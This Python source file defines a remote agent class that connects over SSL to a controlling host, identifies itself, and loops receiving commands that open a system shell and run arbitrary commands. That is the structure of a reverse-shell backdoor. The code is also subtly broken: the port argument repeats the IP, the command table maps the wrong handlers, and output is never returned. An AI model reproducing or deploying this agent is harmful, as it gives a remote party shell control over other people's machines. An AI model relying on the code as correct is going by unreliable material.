from core.session import SSLClient
import socket
import sys
from core import shell


class RemoteCommunicator(SSLClient):
    _DEFAULT_TIMEOUT = 3
    _IDENTIFIER = 0x1234567890
    _EOL = "\x03\x03EOLEOLEOL"
    _SELF_SHUTDOWN_OUT = "SELF_SHUTDOWN"
    _SUCCESS_CREATE_CMD_OUT = "SUCCESS_CREATE_CMD"
    _SUCCESS_CLOSE_CMD_OUT = "SUCCESS_CLOSE_CMD"
    _CMD_TEMPLATE_OUT = "OUTPUT {stdout}"
    _COMMAND_PATTERN = "COMMAND\x03\x03ARGS" + _EOL

    def __init__(self, local_toxido_ip, local_toxido_port):
        super(RemoteCommunicator, self).__init__(local_toxido_ip, local_toxido_ip)
        self._sock.settimeout(self._DEFAULT_TIMEOUT)

    def func(self):
        pass

    def _send_identifier(self):
        """ sends identifier to local_toxido for identifying himself as remote_toxido"""
        self.send_data(self._IDENTIFIER)

    def connect(self):
        super(RemoteCommunicator, self).connect()
        self._send_identifier()

    def handle_command(self, data):
        command, arg = data[:-1 * len(self._EOL)].split("\x03\x03")
        return self.COMMAND_DICT[command](arg)

    def close(self):
        self._close_cmd()
        super(RemoteCommunicator, self).close()

    def _shutdown(self, args=None):
        """shutdown, args is ignored."""
        return self._SELF_SHUTDOWN_OUT

    def loop_get_commands(self):
        while True:
            data = self.recv_data()
            next_data = data
            while self._EOL not in next_data:
                next_data = self.recv_data()
                data += next_data

            out = self.handle_command(data)
            if out == self._SELF_SHUTDOWN_OUT:
                self.shutdown()

    def _open_cmd(self, args=None):
        """create shell, argument is ignored."""
        self._cmd_obj = shell.create_shell()
        return self._SUCCESS_CREATE_CMD_OUT

    def _close_cmd(self, args=None):
        if self._cmd_obj:
            self._cmd_obj.close()
        return self._SUCCESS_CLOSE_CMD_OUT

    def _input_cmd_command(self, args):
        data = self._cmd_obj.run(args)
        return self._CMD_TEMPLATE_OUT.format(stdout=data)


    COMMAND_DICT = {"SHUTDOWN": _shutdown, "CMD_IN": _close_cmd, "CMD_OPEN": _open_cmd, "CMD_CLOSE": None}
